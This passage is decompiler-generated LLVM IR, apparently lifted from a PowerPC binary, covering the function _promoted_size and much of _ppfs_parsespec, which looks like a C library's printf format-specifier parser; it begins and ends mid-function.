  uselistorder i32 %v2_10008fac, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_10008fd05, { 1, 0, 2 }
  uselistorder i32 %v3_10008e40, { 1, 0, 2 }
  uselistorder i32 %v2_10008e70, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_10008de8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_10008de0, { 1, 0, 2 }
  uselistorder i32 %v0_10008de0, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_gt.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 19, 18, 8, 9, 10, 11, 0, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_10009020, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10009000, { 1, 0 }
  uselistorder label %dec_label_pc_10008fcc, { 1, 0 }
  uselistorder label %dec_label_pc_10008fc8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10008fc0, { 1, 0 }
  uselistorder label %dec_label_pc_10008f90, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10008f44, { 1, 0 }
  uselistorder label %dec_label_pc_10008f30, { 1, 0 }
  uselistorder label %dec_label_pc_10008e98, { 1, 0 }
  uselistorder label %dec_label_pc_10008fd0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10008e84, { 1, 0 }
  uselistorder label %dec_label_pc_10008e40, { 1, 0 }
  uselistorder label %dec_label_pc_10008e34, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000905c

dec_label_pc_1000905c:                            ; preds = %dec_label_pc_1000905c, %entry
  %v0_1000905c = phi i32 [ ptrtoint (i32* @global_var_10011bc4.299 to i32), %entry ], [ %v1_1000905c, %dec_label_pc_1000905c ]
  %v1_1000905c = add i32 %v0_1000905c, -2
  %v2_1000905c = inttoptr i32 %v1_1000905c to i16*
  %v3_1000905c = load i16, i16* %v2_1000905c, align 2
  %v4_1000905c = sext i16 %v3_1000905c to i32
  %v4_10009060 = icmp eq i32 %v4_1000905c, %arg1
  %v3_10009064.not = icmp ule i32 %v1_1000905c, ptrtoint (i32* @global_var_10011bac.300 to i32)
  %brmerge = or i1 %v4_10009060, %v3_10009064.not
  br i1 %brmerge, label %dec_label_pc_10009070, label %dec_label_pc_1000905c

dec_label_pc_10009070:                            ; preds = %dec_label_pc_1000905c
  %v2_10009078 = sub i32 %v1_1000905c, ptrtoint (i32* @global_var_10011bac.300 to i32)
  %v1_10009080 = udiv i32 %v2_10009078, 2
  %v2_10009080 = and i32 %v2_10009078, -2147483648
  %v3_10009080 = or i32 %v1_10009080, %v2_10009080
  %v2_10009088 = add i32 %v3_10009080, ptrtoint (i32* @global_var_10011bc4.299 to i32)
  %v3_10009088 = inttoptr i32 %v2_10009088 to i8*
  %v4_10009088 = load i8, i8* %v3_10009088, align 1
  %v5_10009088 = zext i8 %v4_10009088 to i32
  ret i32 %v5_10009088

; uselistorder directives
  uselistorder i32 %v2_10009078, { 1, 0 }
  uselistorder i32 %v1_1000905c, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10011bac.300 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10011bc4.299 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_10009090 = load i32, i32* @lr, align 4
  store i32 %v0_10009090, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_100090a8 = add i32 %tmp, 16
  %v2_100090a8 = inttoptr i32 %v1_100090a8 to i32*
  %v3_100090a8 = load i32, i32* %v2_100090a8, align 4
  %v1_100090b0 = and i32 %v3_100090a8, 128
  store i32 %v1_100090b0, i32* %r6.global-to-local, align 4
  %v3_100090b0 = icmp eq i32 %v1_100090b0, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_100090c4 = add i32 %tmp, 24
  %v2_100090c4 = inttoptr i32 %v1_100090c4 to i32*
  %v3_100090c4 = load i32, i32* %v2_100090c4, align 4
  store i32 %v3_100090c4, i32* @r26, align 4
  br i1 %v3_100090b0, label %dec_label_pc_100090cc, label %dec_label_pc_100090e4

dec_label_pc_100090cc:                            ; preds = %entry
  %v2_100090cc = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_10009138

dec_label_pc_100090dc:                            ; preds = %dec_label_pc_1000930c
  %v1_100090dc = add i32 %v0_100092dc, 1
  store i32 %v1_100090dc, i32* @r30, align 4
  br label %dec_label_pc_10009324

dec_label_pc_100090e4:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_100090e8 = load i32, i32* %arg1, align 4
  store i32 %v2_100090e8, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_100090f4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100090f4, i32* @r7, align 4
  br label %dec_label_pc_100090f8

dec_label_pc_100090f8:                            ; preds = %dec_label_pc_10009128.dec_label_pc_100090f8_crit_edge, %dec_label_pc_100090e4
  %v0_10009100 = phi i32 [ %v0_10009100.pre, %dec_label_pc_10009128.dec_label_pc_100090f8_crit_edge ], [ %v2_100090e8, %dec_label_pc_100090e4 ]
  %v0_100090fc = phi i32 [ %v0_100090fc.pre, %dec_label_pc_10009128.dec_label_pc_100090f8_crit_edge ], [ %v2_100090f4, %dec_label_pc_100090e4 ]
  %v0_10009104 = phi i32 [ %v0_100090f8.pre, %dec_label_pc_10009128.dec_label_pc_100090f8_crit_edge ], [ 0, %dec_label_pc_100090e4 ]
  %v1_100090f8 = mul i32 %v0_10009104, 4
  %v2_100090fc = add i32 %v0_10009104, %v0_100090fc
  store i32 %v2_100090fc, i32* %r9.global-to-local, align 4
  %v2_10009100 = add i32 %v1_100090f8, %v0_10009100
  store i32 %v2_10009100, i32* %r11.global-to-local, align 4
  %v1_10009104 = add i32 %v0_10009104, 1
  store i32 %v1_10009104, i32* %r10.global-to-local, align 4
  %v1_10009108 = add i32 %v2_10009100, -4
  %v2_10009108 = inttoptr i32 %v1_10009108 to i32*
  %v3_10009108 = load i32, i32* %v2_10009108, align 4
  store i32 %v3_10009108, i32* %r0.global-to-local, align 4
  %v1_1000910c = trunc i32 %v3_10009108 to i8
  %v3_1000910c = add i32 %v2_100090fc, 24
  %v4_1000910c = inttoptr i32 %v3_1000910c to i8*
  store i8 %v1_1000910c, i8* %v4_1000910c, align 1
  %v0_10009110 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009110 = urem i32 %v0_10009110, 256
  store i32 %v1_10009110, i32* %r0.global-to-local, align 4
  %v0_10009118 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009118 = add i32 %v0_10009118, -4
  %v2_10009118 = inttoptr i32 %v1_10009118 to i32*
  %v3_10009118 = load i32, i32* %v2_10009118, align 4
  store i32 %v3_10009118, i32* %r9.global-to-local, align 4
  %v4_1000911c = icmp eq i32 %v1_10009110, %v3_10009118
  br i1 %v4_1000911c, label %dec_label_pc_10009124, label %dec_label_pc_10009594

dec_label_pc_10009124:                            ; preds = %dec_label_pc_100090f8
  %v3_10009114 = icmp eq i32 %v1_10009110, 0
  br i1 %v3_10009114, label %dec_label_pc_1000912c, label %dec_label_pc_10009128

dec_label_pc_10009128:                            ; preds = %dec_label_pc_10009124
  %v0_10009128 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009128 = add i32 %v0_10009128, -1
  store i32 %v1_10009128, i32* %ctr.global-to-local, align 4
  %v2_10009128 = icmp eq i32 %v1_10009128, 0
  br i1 %v2_10009128, label %dec_label_pc_1000912c, label %dec_label_pc_10009128.dec_label_pc_100090f8_crit_edge

dec_label_pc_10009128.dec_label_pc_100090f8_crit_edge: ; preds = %dec_label_pc_10009128
  %v0_100090f8.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_100090fc.pre = load i32, i32* @r7, align 4
  %v0_10009100.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_100090f8

dec_label_pc_1000912c:                            ; preds = %dec_label_pc_10009128, %dec_label_pc_10009124
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10009130 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_10009138

dec_label_pc_10009138:                            ; preds = %dec_label_pc_100090cc, %dec_label_pc_1000912c
  %v2_10009148.pre-phi = phi i32 [ %.pre, %dec_label_pc_100090cc ], [ %v2_100090f4, %dec_label_pc_1000912c ]
  %storemerge3 = phi i32 [ %v2_100090cc, %dec_label_pc_100090cc ], [ %v2_10009130, %dec_label_pc_1000912c ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32* @r27, align 4
  store i32 %v2_10009148.pre-phi, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009158

dec_label_pc_10009154:                            ; preds = %dec_label_pc_10009264, %dec_label_pc_100092e8
  %v0_10009154 = phi i32 [ %v1_100092e8, %dec_label_pc_100092e8 ], [ %v0_1000924c, %dec_label_pc_10009264 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_100092e8 ], [ %stack_var_-84.2, %dec_label_pc_10009264 ]
  store i32 %v0_10009154, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009158

dec_label_pc_10009158:                            ; preds = %dec_label_pc_10009138, %dec_label_pc_10009154
  %v0_1000916c = phi i32 [ %storemerge3, %dec_label_pc_10009138 ], [ %v0_10009154, %dec_label_pc_10009154 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_10009138 ], [ %stack_var_-84.0, %dec_label_pc_10009154 ]
  %v1_10009158 = inttoptr i32 %v0_1000916c to i8*
  %v2_10009158 = load i8, i8* %v1_10009158, align 1
  %v3_10009158 = zext i8 %v2_10009158 to i32
  store i32 %v3_10009158, i32* %r0.global-to-local, align 4
  store i32 %v0_1000916c, i32* @r30, align 4
  %v3_10009160 = icmp eq i8 %v2_10009158, 42
  br i1 %v3_10009160, label %dec_label_pc_10009168, label %dec_label_pc_10009178

dec_label_pc_10009168:                            ; preds = %dec_label_pc_10009158
  %v0_10009168 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009168 = mul i32 %v0_10009168, -4
  store i32 %v1_10009168, i32* %r0.global-to-local, align 4
  %v1_1000916c = add i32 %v0_1000916c, 1
  store i32 %v1_1000916c, i32* @r30, align 4
  %v0_10009170 = load i32, i32* @r1, align 4
  %v2_10009170 = add i32 %v0_10009170, %v1_10009168
  store i32 %v2_10009170, i32* %r9.global-to-local, align 4
  %v0_10009174 = load i32, i32* @r29, align 4
  %v2_10009174 = add i32 %v2_10009170, 8
  %v3_10009174 = inttoptr i32 %v2_10009174 to i32*
  store i32 %v0_10009174, i32* %v3_10009174, align 4
  %v0_10009190.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009178

dec_label_pc_10009178:                            ; preds = %dec_label_pc_10009158, %dec_label_pc_10009168
  %v0_10009190.pre = phi i32 [ %v0_1000916c, %dec_label_pc_10009158 ], [ %v0_10009190.pre.pre, %dec_label_pc_10009168 ]
  %v3_10009178 = load i32, i32* @global_var_100234d8, align 4
  store i32 %v3_10009178, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10009190

dec_label_pc_10009184:                            ; preds = %dec_label_pc_10009190
  %v2_10009194 = icmp sgt i32 %v0_100091dc, 4094
  br i1 %v2_10009194, label %dec_label_pc_1000918c, label %dec_label_pc_10009188

dec_label_pc_10009188:                            ; preds = %dec_label_pc_10009184
  %v1_10009188 = add i32 %v2_100091a8, -48
  store i32 %v1_10009188, i32* @r8, align 4
  br label %dec_label_pc_1000918c

dec_label_pc_1000918c:                            ; preds = %dec_label_pc_10009184, %dec_label_pc_10009188
  %v0_1000919415 = phi i32 [ %v0_100091dc, %dec_label_pc_10009184 ], [ %v1_10009188, %dec_label_pc_10009188 ]
  %v1_1000918c = add i32 %v0_1000920c, 1
  store i32 %v1_1000918c, i32* @r30, align 4
  br label %dec_label_pc_10009190

dec_label_pc_10009190:                            ; preds = %dec_label_pc_10009178, %dec_label_pc_1000918c
  %v0_100091dc = phi i32 [ 0, %dec_label_pc_10009178 ], [ %v0_1000919415, %dec_label_pc_1000918c ]
  %v0_1000920c = phi i32 [ %v0_10009190.pre, %dec_label_pc_10009178 ], [ %v1_1000918c, %dec_label_pc_1000918c ]
  %v1_10009190 = inttoptr i32 %v0_1000920c to i8*
  %v2_10009190 = load i8, i8* %v1_10009190, align 1
  %v3_10009190 = zext i8 %v2_10009190 to i32
  store i32 %v3_10009190, i32* %r11.global-to-local, align 4
  %v1_10009198 = mul nuw nsw i32 %v3_10009190, 2
  store i32 %v1_10009198, i32* %r9.global-to-local, align 4
  %v2_1000919c = add i32 %v1_10009198, %v3_10009178
  %v3_1000919c = inttoptr i32 %v2_1000919c to i16*
  %v4_1000919c = load i16, i16* %v3_1000919c, align 2
  %v5_1000919c = zext i16 %v4_1000919c to i32
  store i32 %v5_1000919c, i32* %r0.global-to-local, align 4
  %v1_100091a0 = mul i32 %v0_100091dc, 10
  %v1_100091a4 = and i32 %v5_1000919c, 8
  store i32 %v1_100091a4, i32* @r25, align 4
  %v3_100091a4 = icmp eq i32 %v1_100091a4, 0
  %v2_100091a8 = add i32 %v3_10009190, %v1_100091a0
  store i32 %v2_100091a8, i32* %r9.global-to-local, align 4
  br i1 %v3_100091a4, label %dec_label_pc_100091b0, label %dec_label_pc_10009184

dec_label_pc_100091b0:                            ; preds = %dec_label_pc_10009190
  %v0_100091b0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100091b0 = add i32 %v0_100091b0, -1
  %v2_100091b0 = inttoptr i32 %v1_100091b0 to i8*
  %v3_100091b0 = load i8, i8* %v2_100091b0, align 1
  %v4_100091b0 = zext i8 %v3_100091b0 to i32
  store i32 %v4_100091b0, i32* %r0.global-to-local, align 4
  %v3_100091b4 = icmp eq i8 %v3_100091b0, 37
  br i1 %v3_100091b4, label %dec_label_pc_100091bc, label %dec_label_pc_10009284

dec_label_pc_100091bc:                            ; preds = %dec_label_pc_100091b0
  %v3_100091bc = icmp eq i8 %v2_10009190, 36
  br i1 %v3_100091bc, label %dec_label_pc_100091c4, label %dec_label_pc_100091f8

dec_label_pc_100091c4:                            ; preds = %dec_label_pc_100091bc
  %tmp58 = icmp slt i32 %v0_100091dc, 1
  br i1 %tmp58, label %dec_label_pc_100091f8, label %dec_label_pc_100091cc

dec_label_pc_100091cc:                            ; preds = %dec_label_pc_100091c4
  %v0_100091cc = load i32, i32* @r26, align 4
  %v3_100091cc = icmp eq i32 %v0_100091cc, 0
  %v1_100091d0 = add i32 %v0_1000920c, 1
  store i32 %v1_100091d0, i32* %r10.global-to-local, align 4
  br i1 %v3_100091cc, label %dec_label_pc_10009594, label %dec_label_pc_100091d8

dec_label_pc_100091d8:                            ; preds = %dec_label_pc_100091cc
  %v3_100091d8 = icmp sgt i32 %v0_100091dc, %v0_100091cc
  br i1 %v3_100091d8, label %dec_label_pc_100091e4, label %dec_label_pc_100091f0

dec_label_pc_100091e4:                            ; preds = %dec_label_pc_100091d8
  store i32 %v0_100091dc, i32* @r26, align 4
  br label %dec_label_pc_100091f0

dec_label_pc_100091ec:                            ; preds = %dec_label_pc_10009214, %dec_label_pc_1000920c
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_100091f0

dec_label_pc_100091f0:                            ; preds = %dec_label_pc_100091d8, %dec_label_pc_100091e4, %dec_label_pc_100091ec
  %v0_100091f0 = phi i32 [ %v0_100091b0, %dec_label_pc_100091ec ], [ %v1_100091d0, %dec_label_pc_100091e4 ], [ %v1_100091d0, %dec_label_pc_100091d8 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_100091ec ], [ %v0_100091dc, %dec_label_pc_100091e4 ], [ %v0_100091dc, %dec_label_pc_100091d8 ]
  br label %dec_label_pc_1000922c

dec_label_pc_100091f8:                            ; preds = %dec_label_pc_100091bc, %dec_label_pc_100091c4
  %v0_100091f8 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_100091f8, 1
  br i1 %tmp59, label %dec_label_pc_1000920c, label %dec_label_pc_10009200

dec_label_pc_10009200:                            ; preds = %dec_label_pc_100091f8
  %v3_10009200 = icmp eq i8 %v2_10009190, 109
  br i1 %v3_10009200, label %dec_label_pc_10009284, label %dec_label_pc_10009594

dec_label_pc_1000920c:                            ; preds = %dec_label_pc_100091f8
  %v3_1000920c = icmp ugt i32 %v0_1000920c, %v0_100091b0
  br i1 %v3_1000920c, label %dec_label_pc_10009214, label %dec_label_pc_100091ec

dec_label_pc_10009214:                            ; preds = %dec_label_pc_1000920c
  %v1_10009214 = inttoptr i32 %v0_100091b0 to i8*
  %v2_10009214 = load i8, i8* %v1_10009214, align 1
  %v3_10009214 = zext i8 %v2_10009214 to i32
  store i32 %v3_10009214, i32* %r0.global-to-local, align 4
  store i32 %v0_100091b0, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_10009220 = icmp eq i8 %v2_10009214, 48
  br i1 %v3_10009220, label %dec_label_pc_100091ec, label %dec_label_pc_10009288

dec_label_pc_1000922c:                            ; preds = %dec_label_pc_10009248, %dec_label_pc_100091f0
  %v0_1000924c = phi i32 [ %v0_100091f0, %dec_label_pc_100091f0 ], [ %v1_1000924c, %dec_label_pc_10009248 ]
  store i32 %v0_1000924c, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10011ba4.301 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_1000923c = inttoptr i32 %v0_1000924c to i8*
  br label %dec_label_pc_10009234

dec_label_pc_10009234:                            ; preds = %dec_label_pc_10009254, %dec_label_pc_1000922c
  %v1_10009248 = phi i32 [ %v1_10009258, %dec_label_pc_10009254 ], [ 1, %dec_label_pc_1000922c ]
  %v0_10009234 = phi i32 [ %v1_10009238, %dec_label_pc_10009254 ], [ ptrtoint ([8 x i8]* @global_var_10011ba4.301 to i32), %dec_label_pc_1000922c ]
  %v1_10009234 = inttoptr i32 %v0_10009234 to i8*
  %v2_10009234 = load i8, i8* %v1_10009234, align 1
  %v3_10009234 = zext i8 %v2_10009234 to i32
  store i32 %v3_10009234, i32* %r9.global-to-local, align 4
  %v1_10009238 = add i32 %v0_10009234, 1
  store i32 %v1_10009238, i32* %r11.global-to-local, align 4
  %v2_1000923c = load i8, i8* %v1_1000923c, align 1
  %v3_1000923c = zext i8 %v2_1000923c to i32
  store i32 %v3_1000923c, i32* %r0.global-to-local, align 4
  %v4_10009240 = icmp eq i8 %v2_1000923c, %v2_10009234
  br i1 %v4_10009240, label %dec_label_pc_10009248, label %dec_label_pc_10009254

dec_label_pc_10009248:                            ; preds = %dec_label_pc_10009234
  %v0_10009248 = load i32, i32* %r6.global-to-local, align 4
  %v2_10009248 = or i32 %v0_10009248, %v1_10009248
  store i32 %v2_10009248, i32* %r6.global-to-local, align 4
  %v1_1000924c = add i32 %v0_1000924c, 1
  br label %dec_label_pc_1000922c

dec_label_pc_10009254:                            ; preds = %dec_label_pc_10009234
  %v1_10009254 = inttoptr i32 %v1_10009238 to i8*
  %v2_10009254 = load i8, i8* %v1_10009254, align 1
  %v3_10009254 = zext i8 %v2_10009254 to i32
  store i32 %v3_10009254, i32* %r0.global-to-local, align 4
  %v1_10009258 = mul i32 %v1_10009248, 2
  store i32 %v1_10009258, i32* %r10.global-to-local, align 4
  %v3_1000925c = icmp eq i8 %v2_10009254, 0
  br i1 %v3_1000925c, label %dec_label_pc_10009264, label %dec_label_pc_10009234

dec_label_pc_10009264:                            ; preds = %dec_label_pc_10009254
  %v1_10009264 = add i32 %v0_1000924c, -1
  %v2_10009264 = inttoptr i32 %v1_10009264 to i8*
  %v3_10009264 = load i8, i8* %v2_10009264, align 1
  %v4_10009264 = zext i8 %v3_10009264 to i32
  store i32 %v4_10009264, i32* %r0.global-to-local, align 4
  %v0_10009268 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009268 = and i32 %v0_10009268, 10
  store i32 0, i32* @r8, align 4
  %v3_10009270 = icmp eq i8 %v3_10009264, 37
  %v1_10009274 = udiv i32 %v1_10009268, 2
  store i32 %v1_10009274, i32* %r9.global-to-local, align 4
  %v2_10009278 = sub nuw nsw i32 -1, %v1_10009274
  %v3_10009278 = and i32 %v0_10009268, %v2_10009278
  store i32 %v3_10009278, i32* %r6.global-to-local, align 4
  br i1 %v3_10009270, label %dec_label_pc_10009288, label %dec_label_pc_10009154

dec_label_pc_10009284:                            ; preds = %dec_label_pc_100091b0, %dec_label_pc_10009200
  store i32 %v0_100091b0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009288

dec_label_pc_10009288:                            ; preds = %dec_label_pc_10009214, %dec_label_pc_10009264, %dec_label_pc_10009284
  %v0_100092bc = phi i32 [ 0, %dec_label_pc_10009264 ], [ %v0_100091dc, %dec_label_pc_10009214 ], [ %v0_100091dc, %dec_label_pc_10009284 ]
  %v1_100092c8 = phi i32 [ %v0_1000924c, %dec_label_pc_10009264 ], [ %v0_1000920c, %dec_label_pc_10009214 ], [ %v0_1000920c, %dec_label_pc_10009284 ]
  %v0_100092c4 = phi i32 [ %v1_10009238, %dec_label_pc_10009264 ], [ %v0_100091b0, %dec_label_pc_10009214 ], [ %v0_100091b0, %dec_label_pc_10009284 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_10009264 ], [ %stack_var_-84.1, %dec_label_pc_10009214 ], [ %stack_var_-84.1, %dec_label_pc_10009284 ]
  %v1_10009288 = inttoptr i32 %v0_100092c4 to i8*
  %v2_10009288 = load i8, i8* %v1_10009288, align 1
  %v3_10009288 = zext i8 %v2_10009288 to i32
  store i32 %v3_10009288, i32* %r0.global-to-local, align 4
  %v3_1000928c = icmp eq i8 %v2_10009288, 42
  br i1 %v3_1000928c, label %dec_label_pc_10009294, label %dec_label_pc_100092d4

dec_label_pc_10009294:                            ; preds = %dec_label_pc_10009288
  %v0_10009294 = load i32, i32* @r26, align 4
  %v3_10009294 = icmp eq i32 %v0_10009294, 0
  br i1 %v3_10009294, label %dec_label_pc_100092c4, label %dec_label_pc_1000929c

dec_label_pc_1000929c:                            ; preds = %dec_label_pc_10009294
  %v1_1000929c = inttoptr i32 %v1_100092c8 to i8*
  %v2_1000929c = load i8, i8* %v1_1000929c, align 1
  %v3_1000929c = zext i8 %v2_1000929c to i32
  store i32 %v3_1000929c, i32* %r0.global-to-local, align 4
  %v3_100092a0 = icmp eq i8 %v2_1000929c, 36
  br i1 %v3_100092a0, label %dec_label_pc_100092a8, label %dec_label_pc_10009594

dec_label_pc_100092a8:                            ; preds = %dec_label_pc_1000929c
  %tmp60 = icmp slt i32 %v0_100092bc, 1
  br i1 %tmp60, label %dec_label_pc_10009594, label %dec_label_pc_100092b0

dec_label_pc_100092b0:                            ; preds = %dec_label_pc_100092a8
  %v0_100092b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100092b0 = mul i32 %v0_100092b0, -4
  %v1_100092b4 = add i32 %v1_100092c8, 1
  store i32 %v1_100092b4, i32* @r30, align 4
  %v0_100092b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_100092b8 = add i32 %v0_100092b8, %v1_100092b0
  store i32 %v2_100092b8, i32* %r9.global-to-local, align 4
  %v2_100092bc = add i32 %v2_100092b8, 12
  %v3_100092bc = inttoptr i32 %v2_100092bc to i32*
  store i32 %v0_100092bc, i32* %v3_100092bc, align 4
  %v0_100092dc.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100092d0

dec_label_pc_100092c4:                            ; preds = %dec_label_pc_10009294
  %v1_100092c4 = add i32 %v0_100092c4, 1
  store i32 %v1_100092c4, i32* %r0.global-to-local, align 4
  %v4_100092c8 = icmp eq i32 %v1_100092c4, %v1_100092c8
  br i1 %v4_100092c8, label %dec_label_pc_100092d0, label %dec_label_pc_10009594

dec_label_pc_100092d0:                            ; preds = %dec_label_pc_100092c4, %dec_label_pc_100092b0
  %v0_100092dc.pre = phi i32 [ %v1_100092c8, %dec_label_pc_100092c4 ], [ %v0_100092dc.pre.pre, %dec_label_pc_100092b0 ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_100092d4

dec_label_pc_100092d4:                            ; preds = %dec_label_pc_10009288, %dec_label_pc_100092d0
  %v0_100092dc = phi i32 [ %v1_100092c8, %dec_label_pc_10009288 ], [ %v0_100092dc.pre, %dec_label_pc_100092d0 ]
  %v0_100092ec = phi i32 [ %v0_100092bc, %dec_label_pc_10009288 ], [ -2147483648, %dec_label_pc_100092d0 ]
  %v0_100092d4 = load i32, i32* %r5.global-to-local, align 4
  %v3_100092d4 = icmp eq i32 %v0_100092d4, 0
  %v1_100092dc = inttoptr i32 %v0_100092dc to i8*
  br i1 %v3_100092d4, label %dec_label_pc_100092dc, label %dec_label_pc_10009300

dec_label_pc_100092dc:                            ; preds = %dec_label_pc_100092d4
  %v2_100092dc = load i8, i8* %v1_100092dc, align 1
  %v3_100092dc = zext i8 %v2_100092dc to i32
  store i32 %v3_100092dc, i32* %r0.global-to-local, align 4
  %v3_100092e0 = icmp eq i8 %v2_100092dc, 46
  br i1 %v3_100092e0, label %dec_label_pc_100092e8, label %dec_label_pc_100092f8

dec_label_pc_100092e8:                            ; preds = %dec_label_pc_100092dc
  %v1_100092e8 = add i32 %v0_100092dc, 1
  store i32 %v0_100092ec, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009154

dec_label_pc_100092f8:                            ; preds = %dec_label_pc_100092dc
  store i32 %v0_100092ec, i32* @r31, align 4
  br label %dec_label_pc_10009300

dec_label_pc_10009300:                            ; preds = %dec_label_pc_100092d4, %dec_label_pc_100092f8
  %storemerge1 = phi i32 [ -1, %dec_label_pc_100092f8 ], [ %v0_100092ec, %dec_label_pc_100092d4 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  %v2_10009304 = load i8, i8* %v1_100092dc, align 1
  %v3_10009304 = zext i8 %v2_10009304 to i32
  store i32 %v3_10009304, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10011b4c.302 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000930c

dec_label_pc_1000930c:                            ; preds = %dec_label_pc_10009318, %dec_label_pc_10009300
  %v0_10009318 = phi i32 [ %v1_10009318, %dec_label_pc_10009318 ], [ ptrtoint ([9 x i8]* @global_var_10011b4c.302 to i32), %dec_label_pc_10009300 ]
  %v1_1000930c = inttoptr i32 %v0_10009318 to i8*
  %v2_1000930c = load i8, i8* %v1_1000930c, align 1
  %v3_1000930c = zext i8 %v2_1000930c to i32
  store i32 %v3_1000930c, i32* %r0.global-to-local, align 4
  %v4_10009310 = icmp eq i8 %v2_10009304, %v2_1000930c
  br i1 %v4_10009310, label %dec_label_pc_100090dc, label %dec_label_pc_10009318

dec_label_pc_10009318:                            ; preds = %dec_label_pc_1000930c
  %v1_10009318 = add i32 %v0_10009318, 1
  %v2_10009318 = inttoptr i32 %v1_10009318 to i8*
  %v3_10009318 = load i8, i8* %v2_10009318, align 1
  %v4_10009318 = zext i8 %v3_10009318 to i32
  store i32 %v4_10009318, i32* %r0.global-to-local, align 4
  store i32 %v1_10009318, i32* %r11.global-to-local, align 4
  %v3_1000931c = icmp eq i8 %v3_10009318, 0
  br i1 %v3_1000931c, label %dec_label_pc_10009324, label %dec_label_pc_1000930c

dec_label_pc_10009324:                            ; preds = %dec_label_pc_10009318, %dec_label_pc_100090dc
  %v0_1000934c = phi i32 [ %v1_100090dc, %dec_label_pc_100090dc ], [ %v0_100092dc, %dec_label_pc_10009318 ]
